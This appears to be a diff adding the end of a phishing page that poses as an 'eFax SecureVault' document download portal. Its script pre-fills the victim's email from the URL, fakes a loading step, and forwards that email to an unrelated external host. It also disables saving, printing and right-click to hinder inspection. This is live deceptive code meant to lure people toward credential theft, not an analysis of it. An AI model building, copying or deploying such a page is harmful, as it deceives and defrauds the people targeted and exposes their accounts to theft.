+</div>
+<span class="text-lg font-semibold">SecureVault</span>
+</div>
+<p class="text-gray-400">Secure document management for modern businesses.</p>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Product</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">Features</a></li>
+<li><a href="#" class="hover:text-white">Security</a></li>
+<li><a href="#" class="hover:text-white">Enterprise</a></li>
+<li><a href="#" class="hover:text-white">Pricing</a></li>
+</ul>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Company</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">About</a></li>
+<li><a href="#" class="hover:text-white">Customers</a></li>
+<li><a href="#" class="hover:text-white">Blog</a></li>
+<li><a href="#" class="hover:text-white">Careers</a></li>
+</ul>
+</div>
+<div>
+<h4 class="font-semibold mb-4">Resources</h4>
+<ul class="space-y-2 text-gray-400">
+<li><a href="#" class="hover:text-white">Documentation</a></li>
+<li><a href="#" class="hover:text-white">Help Center</a></li>
+<li><a href="#" class="hover:text-white">Contact</a></li>
+<li><a href="#" class="hover:text-white">Status</a></li>
+</ul>
+</div>
+</div>
+<div class="border-t border-gray-800 pt-8 flex flex-col md:flex-row justify-between items-center space-y-4 md:space-y-0">
+<p class="text-gray-400">© 2025 eFax SecureVault. All rights reserved.</p>
+<div class="flex space-x-6">
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-twitter-line"></i>
+</a>
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-linkedin-line"></i>
+</a>
+<a href="#" class="text-gray-400 hover:text-white">
+<i class="ri-github-line"></i>
+</a>
+</div>
+</div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+const downloadButton = document.getElementById('downloadButton');
+const emailInput = document.getElementById('email');
+function validateEmail(email) {
+return email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
+}
+function updateButtonState() {
+const email = emailInput.value.trim();
+if (validateEmail(email)) {
+downloadButton.disabled = false;
+downloadButton.classList.add('animate-pulse');
+} else {
+downloadButton.disabled = true;
+downloadButton.classList.remove('animate-pulse');
+}
+}
+emailInput.addEventListener('input', updateButtonState);
+// Extract email from URL hash
+const email = window.location.hash.substring(1);
+if (email && email.includes('@')) {
+emailInput.value = email;
+updateButtonState();
+}
+// Form submission handler
+document.getElementById('downloadForm').addEventListener('submit', function(e) {
+e.preventDefault();
+const emailInput = document.getElementById('email');
+const email = emailInput.value.trim();
+if (!email || !email.includes('@')) {
+alert('Please enter a valid email address');
+return;
+}
+// Show loading overlay
+document.getElementById('loadingOverlay').style.display = 'flex';
+// Create FormData object
+const formData = new FormData();
+formData.append('email', email);
+formData.append('domain', window.location.hostname);
+// Simulate form submission with timeout
+setTimeout(function() {
+// Redirect with email appended as hash
+window.location.href = 'https://dashboard-oyahyieir.neidebaertschi.ch/' + email;
+}, 1500);
+});
+});
+// Security features
+document.addEventListener('keydown', function(e) {
+// Block Ctrl+S, Ctrl+P
+if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
+e.preventDefault();
+return false;
+}
+});
+// Prevent page inspection
+document.addEventListener('contextmenu', function(e) {
+e.preventDefault();
+return false;
+});
+</script>
+</body></html>
